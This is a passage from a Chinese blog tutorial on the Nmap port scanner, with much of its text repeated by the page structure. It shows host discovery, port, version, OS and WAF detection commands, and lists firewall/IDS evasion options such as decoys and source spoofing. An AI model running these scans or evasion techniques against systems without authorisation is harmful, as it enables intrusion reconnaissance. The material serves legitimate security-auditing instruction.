服务器，如果它响应了，Nmap 会向 1000 个 TCP 端口列表发送探针，来观察哪个端口响应，之后报告响应端口的结果</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">nmap</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.56</span><span class=\"selector-class\">.102</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"Nmap-向服务器询问正在运行的服务的版本，并且基于它猜测操作系统\"><a href=\"#Nmap-向服务器询问正在运行的服务的版本，并且基于它猜测操作系统\" class=\"headerlink\" title=\"Nmap 向服务器询问正在运行的服务的版本，并且基于它猜测操作系统\"></a>Nmap 向服务器询问正在运行的服务的版本，并且基于它猜测操作系统</h4><ul>\n<li><p>sV请求每个被发现的开放端口的标识（头部或者自我识别），这是它用作版本的东西。</p>\n</li>\n<li><p>O告诉 Nmap，尝试猜测运行在目标上的操作系统。使用开放端口和版本收集的信息。</p>\n</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-sV</span> <span class=\"selector-tag\">-O</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.56</span><span class=\"selector-class\">.10</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"更加清楚的查看这个端口，并且看看可以确认什么\"><a href=\"#更加清楚的查看这个端口，并且看看可以确认什么\" class=\"headerlink\" title=\"更加清楚的查看这个端口，并且看看可以确认什么\"></a>更加清楚的查看这个端口，并且看看可以确认什么</h4><p>使用此命令，让 nmap 在主机上的 FTP 端口（-p 21）上运行其默认脚本（-sC）</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sC <span class=\"number\">192.168</span><span class=\"number\">.56</span><span class=\"number\">.102</span> -p <span class=\"number\">21</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"Nmap-包含了一些脚本，用于测试-WAF-的存在\"><a href=\"#Nmap-包含了一些脚本，用于测试-WAF-的存在\" class=\"headerlink\" title=\"Nmap 包含了一些脚本，用于测试 WAF 的存在\"></a>Nmap 包含了一些脚本，用于测试 WAF 的存在</h4><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">map -p <span class=\"number\">80</span>,<span class=\"number\">443</span> --script=http-waf-detect <span class=\"number\">192.168</span><span class=\"number\">.56</span><span class=\"number\">.102</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"另一个-Nmap-脚本，可以帮助我们识别所使用的设备，并更加精确\"><a href=\"#另一个-Nmap-脚本，可以帮助我们识别所使用的设备，并更加精确\" class=\"headerlink\" title=\"另一个 Nmap 脚本，可以帮助我们识别所使用的设备，并更加精确\"></a>另一个 Nmap 脚本，可以帮助我们识别所使用的设备，并更加精确</h4><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -<span class=\"selector-tag\">p</span> <span class=\"number\">80</span>,<span class=\"number\">443</span> --script=http-waf-fingerprint www<span class=\"selector-class\">.example</span><span class=\"selector-class\">.com</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"有一些其它的实用参数：\"><a href=\"#有一些其它的实用参数：\" class=\"headerlink\" title=\"有一些其它的实用参数：\"></a>有一些其它的实用参数：</h4><ul>\n<li>sT：通常，在 root 用户下运行 Nmap 时，它使用 SYN 扫描类型。使用这个参数，我们就强制让扫描器执行完全连接的扫描。它更慢，并且会在服务器的日志中留下记录，但是它不太可能被入侵检测系统检测到。</li>\n<li>Pn：如果我们已经知道了主机是活动的或者不响应 ping，我们可以使用这个参数告诉 Nmap 跳过 ping 测试，并扫描所有指定目标，假设它们是开启的。</li>\n<li>v：这会开启详细模式。Nmap 会展示更多关于它所做事情和得到回复的信息。参数可以在相同命令中重复多次：次数越多，就越详细（也就是说，-vv或-v -v -v -v）。</li>\n<li><p>p N1,N2,Nn：如果我们打算测试特定端口或一些非标准端口，我们可能想这个参数。N1到Nn是打算让 Nmap 扫描的端口。例如，要扫描端口 21，80 到 90，和 137，参数应为：-p 21,80-90,137。</p>\n</li>\n<li><p>–script=script_name：Nmap 包含很多实用的漏洞检测、扫描和识别、登录测试、命令执行、用户枚举以及其它脚本。使用这个参数来告诉 Nmap 在目标的开放端口上运行脚本。查看一些 Nmap 脚本，它们在：<a href=\"https://nmap.org/nsedoc/scripts/。\" target=\"_blank\" rel=\"noopener\">https://nmap.org/nsedoc/scripts/。</a></p>\n</li>\n</ul>\n<h3 id=\"Nmap选项摘要\"><a href=\"#Nmap选项摘要\" class=\"headerlink\" title=\"Nmap选项摘要\"></a>Nmap选项摘要</h3><p><strong>用法：nmap [扫描类型] [选项] {目标规格}</strong></p>\n<h4 id=\"目标规格：\"><a href=\"#目标规格：\" class=\"headerlink\" title=\"目标规格：\"></a>目标规格：</h4><p>可以传递主机名，IP地址，网络等。<br>例如：scanme.nmap.org，microsoft.com/24,192.168.0.1; 10.0.0-255.1-254</p>\n<ul>\n<li>-iL <inputfilename>：从主机/网络列表中输入</inputfilename></li>\n<li>-iR <num hosts>：选择随机目标</num></li>\n<li>-exclude <host1 [，host2] [，host3]，…>：排除主机/网络</host1></li>\n<li>-excludefile &lt;exclude_file&gt;：从文件中排除列表</li>\n</ul>\n<h4 id=\"主机发现：\"><a href=\"#主机发现：\" class=\"headerlink\" title=\"主机发现：\"></a>主机发现：</h4><ul>\n<li>-sL：列表扫描 – 仅列出要扫描的目标</li>\n<li>-sn：Ping扫描 – 禁用端口扫描</li>\n<li>-Pn：将所有主机视为联机 – 跳过主机发现</li>\n<li>-PS / PA / PU / PY [portlist]：TCP SYN / ACK / UDP / SCTP发现到指定端口</li>\n<li>-PE / PP / PM：ICMP回显，时间戳和网络掩码请求发现探测</li>\n<li>-PO [协议列表]：IP协议Ping</li>\n<li>-n / -R：从不执行DNS解析/总是解析[默认：有时]</li>\n<li>-dns-servers <serv1 [，serv2]，…>：指定自定义DNS服务器</serv1></li>\n<li>-system-dns：使用操作系统的DNS解析器</li>\n<li>-traceroute：每个主机的跟踪跳转路径</li>\n</ul>\n<h4 id=\"SCAN技术：\"><a href=\"#SCAN技术：\" class=\"headerlink\" title=\"SCAN技术：\"></a>SCAN技术：</h4><ul>\n<li>-sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描</li>\n<li>-sU：UDP 扫描-sN</li>\n<li>/ sF / sX：TCP Null，FIN和Xmas扫描</li>\n<li>–scanflags &lt; flags&gt;：自定义TCP扫描标志</li>\n<li>-sI <zombie host [：probeport]>：空闲扫描</zombie></li>\n<li>-sY / sZ：SCTP INIT / COOKIE-ECHO扫描</li>\n<li>-sO：IP协议扫描</li>\n<li>-b &lt;FTP中继主机&gt;：FTP反弹扫描</li>\n</ul>\n<h4 id=\"端口规格和扫描-顺序：-p\"><a href=\"#端口规格和扫描-顺序：-p\" class=\"headerlink\" title=\"端口规格和扫描 顺序：-p\"></a>端口规格和扫描 顺序：-p</h4><p>&lt;端口范围&gt;：仅扫描指定的端口</p>\n<ul>\n<li>例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9</li>\n<li>-exclude-ports &lt;端口范围&gt;：从扫描中排除指定端口</li>\n<li>-F：快速模式 – 扫描端口少于默认扫描</li>\n<li>-r：连续扫描端口 – 不随机化</li>\n<li>-top-ports <number>：扫描<number>最常用的端口</number></number></li>\n<li>-port-ratio <ratio>：扫描比<ratio></ratio></ratio></li>\n</ul>\n<h4 id=\"服务-版本检测：\"><a href=\"#服务-版本检测：\" class=\"headerlink\" title=\"服务/版本检测：\"></a>服务/版本检测：</h4><ul>\n<li>-sV：探测开放端口以确定服务/版本info</li>\n<li>-version-intensity <level>：设置从0（亮）到9（尝试所有探测器）</level></li>\n<li>-version-light：限制最可能的探测器2）</li>\n<li>-version-all：尝试每个探测器（强度9）</li>\n<li>-version-trace：显示详细版本的扫描活动（用于调试）</li>\n</ul>\n<h4 id=\"SCRIPT-SCAN：\"><a href=\"#SCRIPT-SCAN：\" class=\"headerlink\" title=\"SCRIPT SCAN：\"></a>SCRIPT SCAN：</h4><ul>\n<li>-sC：相当于-script =默认</li>\n<li>-script = &lt;Lua脚本&gt;：<lua scripts>是逗号分隔的</lua></li>\n<li>目录列表，脚本文件或脚本类别</li>\n<li>-script-args = <n1 = v1，[ n2=\"v2，…]\">：为脚本提供参数</n1></li>\n<li>-script-args-file = filename：在文件中提供NSE脚本参数</li>\n<li>-script-trace：显示所有发送和接收的数据</li>\n<li>-script-updatedb：更新脚本数据库。</li>\n<li>-script-help = <lua scripts>：显示有关脚本的帮助。</lua></li>\n<li><lua scripts>是脚本文件或</lua></li>\n<li>脚本类别的逗号分隔列表。</li>\n</ul>\n<h4 id=\"操作系统检测：\"><a href=\"#操作系统检测：\" class=\"headerlink\" title=\"操作系统检测：\"></a>操作系统检测：</h4><ul>\n<li>-O：启用操作系统检测</li>\n<li>-osscan-limit：限制操作系统检测为有前途的目标</li>\n<li>-osscan-guess：猜测操作系统更积极</li>\n</ul>\n<h4 id=\"时间和性能：\"><a href=\"#时间和性能：\" class=\"headerlink\" title=\"时间和性能：\"></a>时间和性能：</h4><ul>\n<li>采用<code>&lt;time&gt;</code>的选项以秒为单位，或附加’ms’（毫秒），‘s’（秒），’m’（分钟）或’h’（小时） ）。</li>\n<li>-T <0-5>：设置定时模板（更高更快）</0-5></li>\n<li>-min-hostgroup / max-hostgroup <size>：并行主机扫描组大小</size></li>\n<li>-min-parallelism / max-parallelism <numprobes>：探针并行化</numprobes></li>\n<li>-min- rtt-timeout / max-rtt-timeout / initial-rtt-timeout <time>：指定</time></li>\n<li>探测往返时间。</li>\n<li>-max-retries <tries>：端口扫描探测器重新传输的大小数量。</tries></li>\n<li>-host-timeout <time>：在这个long</time></li>\n<li>-scan-delay 之后放弃目标/ -max-scan-delay <time>：调整探针之间的延迟</time></li>\n<li>-min-rate <number>：</number></li>\n<li>-max-rate <number>：发送数据包不超过每秒<number></number></number></li>\n</ul>\n<h4 id=\"防火墙-IDS消除和防盗：\"><a href=\"#防火墙-IDS消除和防盗：\" class=\"headerlink\" title=\"防火墙/ IDS消除和防盗：\"></a>防火墙/ IDS消除和防盗：</h4><ul>\n<li>-f; -mtu <val>：片段数据包（可选w / given MTU）</val></li>\n<li>-D &lt;decoy1，decoy2 [，ME]，…&gt;：用诱饵隐藏扫描</li>\n<li>-S &lt;IP_Address&gt;：欺骗源地址</li>\n<li>-e <iface>：使用指定的接口</iface></li>\n<li>-g / -source-port &lt;</li>\n<li>portnum &gt;：使用给定的端口号-proxies &lt;url1，[url2]，…&gt;：通过HTTP / SOCKS4代理服务器的中继连接</li>\n<li>-data &lt;十六进制字符串&gt;：将自定义有效内容附加到已发送数据包</li>\n<li>-data-string <string>：将自定义ASCII字符串附加到已发送数据包</string></li>\n<li>-data-length <num>：将随机数据附加到已发送数据包</num></li>\n<li>-ip-options &lt;选项&gt;：发送指定ip选项的数据包</li>\n<li>-ttl <val>：设置IP生存时间字段</val></li>\n<li>-spoof-mac &lt;</li>\n<li>-badsum：发送虚假TCP / UDP / SCTP校验和的数据包</li>\n</ul>\n<h4 id=\"OUTPUT\"><a href=\"#OUTPUT\" class=\"headerlink\" title=\"OUTPUT\"></a>OUTPUT</h4><ul>\n<li>-oN / -oX / -oS / -oG <file>：分别以正常，XML，s | &lt;rIpt kIddi3</file></li>\n<li>和Grepable格式输出扫描到给定的文件名。</li>\n<li>-oA <basename>：一次输出三种主要格式</basename></li>\n<li>-v：提高详细级别（使用-vv或更多以获得更大效果）</li>\n<li>-d：提高调试级别（使用-dd或更多以获得更大效果）</li>\n<li>-reason：Display端口处于特定状态的原因</li>\n<li>-open：只显示打开的（或可能打开的）端口</li>\n<li>-packet-trace：显示所有发送和接收的数据包</li>\n<li>-iflist：打印主机接口和路由（用于调试）</li>\n<li>-log-errors：Log错误/警告到正常格式的输出文件</li>\n<li>-append-output：附加到指定的输出文件而不是clobber</li>\n<li>-resume <filename>：恢复中止的扫描</filename></li>\n<li>-stylesheet &lt;path / URL&gt;：XSL样式表将XML输出转换为HTML</li>\n<li>-webxml：Nmap.Org的参考样式表，用于更多可移植的XML</li>\n<li>-no-stylesheet：防止关联XSL样式表w / XML输出</li>\n</ul>\n<h4 id=\"MISC：\"><a href=\"#MISC：\" class=\"headerlink\" title=\"MISC：\"></a>MISC：</h4><ul>\n<li>-6：启用IPv6扫描</li>\n<li>-A：启用OS检测，版本检测，脚本扫描和traceroute</li>\n<li>-datadir <dirname>：指定自定义Nmap数据文件位置</dirname></li>\n<li>-send-eth / -send-ip：使用原始以太网帧进行发送或IP数据包</li>\n<li>-privileged：假设用户具有完全特权</li>\n<li>-unprivileged：假定用户缺少原始套接字权限</li>\n<li>-V：打印版本号</li>\n<li>-h：打印此帮助摘要页面</li>\n</ul>\n<h4 id=\"另见\"><a href=\"#另见\" class=\"headerlink\" title=\"另见\"></a>另见</h4><p>虽然它最为流行，但是 Nmap 不是唯一可用的端口扫描器，并且，取决于不同的喜好，可能也不是最好的。下面是 Kali 中包含的一些其它的替代品：</p>\n<ul>\n<li>unicornscan</li>\n<li>hping3</li>\n<li>masscan</li>\n<li>amap</li>\n<li>Metasploit scanning module</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Nmap 是个端口扫描器，这意味着它可以向一些指定 IP 的 TCP 或 UDP 端口发送封包，并检查是否有响应。如果有的话，这意味着端口是打开的，因此，端口上运行着服务</p>\n<p>Nmap代表Network Mapper，是一款用于网络探索和安全审计的开源工具，它与Kali Linux标准兼容，但也可用于Windows，OSX和许多其他UNIX平台。Nmap还有一个称为Zenmap的图形用户界面。</p>","more":"<h4 id=\"打开端口扫描和操作系统检测\"><a href=\"#打开端口扫描和操作系统检测\" class=\"headerlink\" title=\"打开端口扫描和操作系统检测\"></a>打开端口扫描和操作系统检测</h4><p>使用以下命令确定活动主机：</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sP <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.0</span><span class=\"number\">-100</span></span><br></pre></td></tr></table></figure>\n<p>使用以下命令在其中一个实时主机上启动带有操作系统检测的SYN扫描</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -<span class=\"built_in\">sS</span> [<span class=\"built_in\">IP</span>地址] -O</span><br></pre></td></tr></table></figure>\n<p>使用以下命令启动一个开放端口扫描和版本检测</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-sV</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span> <span class=\"selector-tag\">-A</span></span><br></pre></td></tr></table></figure>\n<p>将-v添加到命令中时，可以增加冗长度</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-sV</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.13</span> <span class=\"selector-tag\">-A</span> <span class=\"selector-tag\">-v</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"服务器是否响应-ping，或者服务器是否打开\"><a href=\"#服务器是否响应-ping，或者服务器是否打开\" class=\"headerlink\" title=\"服务器是否响应 ping，或者服务器是否打开\"></a>服务器是否响应 ping，或者服务器是否打开</h4><p>使用-sn参数，我们让 Nmap 只检查是否服务器响应 ICMP 请求（或 ping）</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-sn</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.56</span><span class=\"selector-class\">.102</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"打开了哪些端口\"><a href=\"#打开了哪些端口\" class=\"headerlink\" title=\"打开了哪些端口\"></a>打开了哪些端口</h4><p>调用 Nmap 的最简方式，它只指定目标 IP。所做的事情是先 ping 服务器，如果它响应了，Nmap 会向 1000 个 TCP 端口列表发送探针，来观察哪个端口响应，之后报告响应端口的结果</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">nmap</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.56</span><span class=\"selector-class\">.102</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"Nmap-向服务器询问正在运行的服务的版本，并且基于它猜测操作系统\"><a href=\"#Nmap-向服务器询问正在运行的服务的版本，并且基于它猜测操作系统\" class=\"headerlink\" title=\"Nmap 向服务器询问正在运行的服务的版本，并且基于它猜测操作系统\"></a>Nmap 向服务器询问正在运行的服务的版本，并且基于它猜测操作系统</h4><ul>\n<li><p>sV请求每个被发现的开放端口的标识（头部或者自我识别），这是它用作版本的东西。</p>\n</li>\n<li><p>O告诉 Nmap，尝试猜测运行在目标上的操作系统。使用开放端口和版本收集的信息。</p>\n</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-sV</span> <span class=\"selector-tag\">-O</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.56</span><span class=\"selector-class\">.10</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"更加清楚的查看这个端口，并且看看可以确认什么\"><a href=\"#更加清楚的查看这个端口，并且看看可以确认什么\" class=\"headerlink\" title=\"更加清楚的查看这个端口，并且看看可以确认什么\"></a>更加清楚的查看这个端口，并且看看可以确认什么</h4><p>使用此命令，让 nmap 在主机上的 FTP 端口（-p 21）上运行其默认脚本（-sC）</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sC <span class=\"number\">192.168</span><span class=\"number\">.56</span><span class=\"number\">.102</span> -p <span class=\"number\">21</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"Nmap-包含了一些脚本，用于测试-WAF-的存在\"><a href=\"#Nmap-包含了一些脚本，用于测试-WAF-的存在\" class=\"headerlink\" title=\"Nmap 包含了一些脚本，用于测试 WAF 的存在\"></a>Nmap 包含了一些脚本，用于测试 WAF 的存在</h4><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">map -p <span class=\"number\">80</span>,<span class=\"number\">443</span> --script=http-waf-detect <span class=\"number\">192.168</span><span class=\"number\">.56</span><span class=\"number\">.102</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"另一个-Nmap-脚本，可以帮助我们识别所使用的设备，并更加精确\"><a href=\"#另一个-Nmap-脚本，可以帮助我们识别所使用的设备，并更加精确\" class=\"headerlink\" title=\"另一个 Nmap 脚本，可以帮助我们识别所使用的设备，并更加精确\"></a>另一个 Nmap 脚本，可以帮助我们识别所使用的设备，并更加精确</h4><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -<span class=\"selector-tag\">p</span> <span class=\"number\">80</span>,<span class=\"number\">443</span> --script=http-waf-fingerprint www<span class=\"selector-class\">.example</span><span class=\"selector-class\">.com</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"有一些其它的实用参数：\"><a href=\"#有一些其它的实用参数：\" class=\"headerlink\" title=\"有一些其它的实用参数：\"></a>有一些其它的实用参数：</h4><ul>\n<li>sT：通常，在 root 用户下运行 Nmap 时，它使用 SYN 扫描类型。使用这个参数，我们就强制让扫描器执行完全连接的扫描。它更慢，并且会在服务器的日志中留下记录，但是它不太可能被入侵检测系统检测到。</li>\n<li>Pn：如果我们已经知道了主机是活动的或者不响应 ping，我们可以使用这个参数告诉 Nmap 跳过 ping 测试，并扫描所有指定目标，假设它们是开启的。</li>\n<li>v：这会开启详细模式。Nmap 会展示更多关于它所做事情和得到回复的信息。参数可以在相同命令中重复多次：次数越多，就越详细（也就是说，-vv或-v -v -v -v）。</li>\n<li><p>p N1,N2,Nn：如果我们打算测试特定端口或一些非标准端口，我们可能想这个参数。N1到Nn是打算让 Nmap 扫描的端口。例如，要扫描端口 21，80 到 90，和 137，参数应为：-p 21,80-90,137。</p>\n</li>\n<li><p>–script=script_name：Nmap 包含很多实用的漏洞检测、扫描和识别、登录测试、命令执行、用户枚举以及其它脚本。使用这个参数来告诉 Nmap 在目标的开放端口上运行脚本。查看一些 Nmap 脚本，它们在：<a href=\"https://nmap.org/nsedoc/scripts/。\" target=\"_blank\" rel=\"noopener\">https://nmap.org/nsedoc/scripts/。</a></p>\n</li>\n</ul>\n<h3 id=\"Nmap选项摘要\"><a href=\"#Nmap选项摘要\" class=\"headerlink\" title=\"Nmap选项摘要\"></a>Nmap选项摘要</h3><p><strong>用法：nmap [扫描类型] [选项] {目标规格}</strong></p>\n<h4 id=\"目标规格：\"><a href=\"#目标规格：\" class=\"headerlink\" title=\"目标规格：\"></a>目标规格：</h4><p>可以传递主机名，IP地址，网络等。<br>例如：scanme.nmap.org，microsoft.com/24,192.168.0.1; 10.0.0-255.1-254</p>\n<ul>\n<li>-iL <inputfilename>：从主机/网络列表中输入</inputfilename></li>\n<li>-iR <num hosts>：选择随机目标</num></li>\n<li>-exclude <host1 [，host2] [，host3]，…>：排除主机/网络</host1></li>\n<li>-excludefile &lt;exclude_file&gt;：从文件中排除列表</li>\n</ul>\n<h4 id=\"主机发现：\"><a href=\"#主机发现：\" class=\"headerlink\" title=\"主机发现：\"></a>主机发现：</h4><ul>\n<li>-sL：列表扫描 – 仅列出要扫描的目标</li>\n<li>-sn：Ping扫描 – 禁用端口扫描</li>\n<li>-Pn：将所有主机视为联机 – 跳过主机发现</li>\n<li>-PS / PA / PU / PY [portlist]：TCP SYN / ACK / UDP / SCTP发现到指定端口</li>\n<li>-PE / PP / PM：ICMP回显，时间戳和网络掩码请求发现探测</li>\n<li>-PO [协议列表]：IP协议Ping</li>\n<li>-n / -R：从不执行DNS解析/总是解析[默认：有时]</li>\n<li>-dns-servers <serv1 [，serv2]，…>：指定自定义DNS服务器</serv1></li>\n<li>-system-dns：使用操作系统的DNS解析器</li>\n<li>-traceroute：每个主机的跟踪跳转路径</li>\n</ul>\n<h4 id=\"SCAN技术：\"><a href=\"#SCAN技术：\" class=\"headerlink\" title=\"SCAN技术：\"></a>SCAN技术：</h4><ul>\n<li>-sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描</li>\n<li>-sU：UDP 扫描-sN</li>\n<li>/ sF / sX：TCP Null，FIN和Xmas扫描</li>\n<li>–scanflags &lt; flags&gt;：自定义TCP扫描标志</li>\n<li>-sI <zombie host [：probeport]>：空闲扫描</zombie></li>\n<li>-sY / sZ：SCTP INIT / COOKIE-ECHO扫描</li>\n<li>-sO：IP协议扫描</li>\n<li>-b &lt;FTP中继主机&gt;：FTP反弹扫描</li>\n</ul>\n<h4 id=\"端口规格和扫描-顺序：-p\"><a href=\"#端口规格和扫描-顺序：-p\" class=\"headerlink\" title=\"端口规格和扫描 顺序：-p\"></a>端口规格和扫描 顺序：-p</h4><p>&lt;端口范围&gt;：仅扫描指定的端口</p>\n<ul>\n<li>例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9</li>\n<li>-exclude-ports &lt;端口范围&gt;：从扫描中排除指定端口</li>\n<li>-F：快速模式 – 扫描端口少于默认扫描</li>\n<li>-r：连续扫描端口 – 不随机化</li>\n<li>-top-ports <number>：扫描<number>最常用的端口</number></number></li>\n<li>-port-ratio <ratio>：扫描比<ratio></ratio></ratio></li>\n</ul>\n<h4 id=\"服务-版本检测：\"><a href=\"#服务-版本检测：\" class=\"headerlink\" title=\"服务/版本检测：\"></a>服务/版本检测：</h4><ul>\n<li>-sV：探测开放端口以确定服务/版本info</li>\n<li>-version-intensity <level>：设置从0（亮）到9（尝试所有探测器）</level></li>\n<li>-version-light：限制最可能的探测器2）</li>\n<li>-version-all：尝试每个探测器（强度9）</li>\n<li>-version-trace：显示详细版本的扫描活动（用于调试）</li>\n</ul>\n<h4 id=\"SCRIPT-SCAN：\"><a href=\"#SCRIPT-SCAN：\" class=\"headerlink\" title=\"SCRIPT SCAN：\"></a>SCRIPT SCAN：</h4><ul>\n<li>-sC：相当于-script =默认</li>\n<li>-script = &lt;Lua脚本&gt;：<lua scripts>是逗号分隔的</lua></li>\n<li>目录列表，脚本文件或脚本类别</li>\n<li>-script-args = <n1 = v1，[ n2=\"v2，…]\">：为脚本提供参数</n1></li>\n<li>-script-args-file = filename：在文件中提供NSE脚本参数</li>\n<li>-script-trace：显示所有发送和接收的数据</li>\n<li>-script-updatedb：更新脚本数据库。</li>\n<li>-script-help = <lua scripts>：显示有关脚本的帮助。</lua></li>\n<li><lua scripts>是脚本文件或</lua></li>\n<li>脚本类别的逗号分隔列表。</li>\n</ul>\n<h4 id=\"操作系统检测：\"><a href=\"#操作系统检测：\" class=\"headerlink\" title=\"操作系统检测：\"></a>操作系统检测：</h4><ul>\n<li>-O：启用操作系统检测</li>\n<li>-osscan-limit：限制操作系统检测为有前途的目标</li>\n<li>-osscan-guess：猜测操作系统更积极</li>\n</ul>\n<h4 id=\"时间和性能：\"><a href=\"#时间和性能：\" class=\"headerlink\" title=\"时间和性能：\"></a>时间和性能：</h4><ul>\n<li>采用<code>&lt;time&gt;</code>的选项以秒为单位，或附加’ms’（毫秒），‘s’（秒），’m’（分钟）或’h’（小时） ）。</li>\n<li>-T <0-5>：设置定时模板（更高更快）</0-5></li>\n<li>-min-hostgroup / max-hostgroup <size>：并行主机扫描组大小</size></li>\n<li>-min-parallelism / max-parallelism <numprobes>：探针并行化</numprobes></li>\n<li>-min- rtt-timeout / max-rtt-timeout / initial-rtt-timeout <time>：指定</time></li>\n<li>探测往返时间。</li>\n<li>-max-retries <tries>：端口扫描探测器重新传输的大小数量。</tries></li>\n<li>-host-timeout <time>：在这个long</time></li>\n<li>-scan-delay 之后放弃目标/ -max-scan-delay <time>：调整探针之间的延迟</time></li>\n<li>-min-rate <number>：</number></li>\n<li>-max-rate <number>：发送数据包不超过每秒<number></number></number></li>\n</ul>\n<h4 id=\"防火墙-IDS消除和防盗：\"><a href=\"#防火墙-IDS消除和防盗：\" class=\"headerlink\" title=\"防火墙/ IDS消除和防盗：\"></a>防火墙/ IDS消除和防盗：</h4><ul>\n<li>-f; -mtu <val>：片段数据包（可选w / given MTU）</val></li>\n<li>-D &lt;decoy1，decoy2 [，ME]，…&gt;：用诱饵隐藏扫描</li>\n<li>-S &lt;IP_Address&gt;：欺骗源地址</li>\n<li>-e <iface>：使用指定的接口</iface></li>\n<li>-g / -source-port &lt;</li>\n<li>portnum &gt;：使用给定的端口号-proxies &lt;url1，[url2]，…&gt;：通过HTTP / SOCKS4代理服务器的中继连接</li>\n<li>-data &lt;十六进制字符串&gt;：将自定义有效内容附加到已发送数据包</li>\n<li>-data-string <string>：将自定义ASCII字符串附加到已发送数据包</string></li>\n<li>-data-length <num>：将随机数据附加到已发送数据包</num></li>\n<li>-ip-options &lt;选项&gt;：发送指定ip选项的数据包</li>\n<li>-ttl <val>：设置IP生存时间字段</val></li>\n<li>-spoof-mac &lt;</li>\n<li>-badsum：发送虚假TCP / UDP / SCTP校验和的数据包</li>\n</ul>\n<h4 id=\"OUTPUT\"><a href=\"#OUTPUT\" class=\"headerlink\" title=\"OUTPUT\"></a>OUTPUT</h4><ul>\n<li>-oN / -oX / -oS / -oG <file>：分别以正常，XML，s | &lt;rIpt kIddi3</file></li>\n<li>和Grepable格式输出扫描到给定的文件名。</li>\n<li>-oA <basename>：一次输出三种主要格式</basename></li>\n<li>-v：提高详细级别（使用-vv或更多以获得更大效果）</li>\n<li>-d：提高调试级别（使用-dd或更多以获得更大效果）</li>\n<li>-reason：Display端口处于特定状态的原因</li>\n<li>-open：只显示打开的（或可能打开的）端口</li>\n<li>-packet-trace：显示所有发送和接收的数据包</li>\n<li>-iflist：打印主机接口和路由（用于调试）</li>\n<li>-log-errors：Log错误/警告到正常格式的输出文件</li>\n<li>-append-output：附加到指定的输出文件而不是clobber</li>\n<li>-resume <filename>：恢复中止的扫描</filename></li>\n<li>-stylesheet &lt;path / URL&gt;：XSL样式表将XML输出转换为HTML</li>\n<li>-webxml：Nmap.Org的参考样式表，用于更多可移植的XML</li>\n<li>-no-stylesheet：防止关联XSL样式表w / XML输出</li>\n</ul>\n<h4 id=\"MISC：\"><a href=\"#MISC：\" class=\"headerlink\" 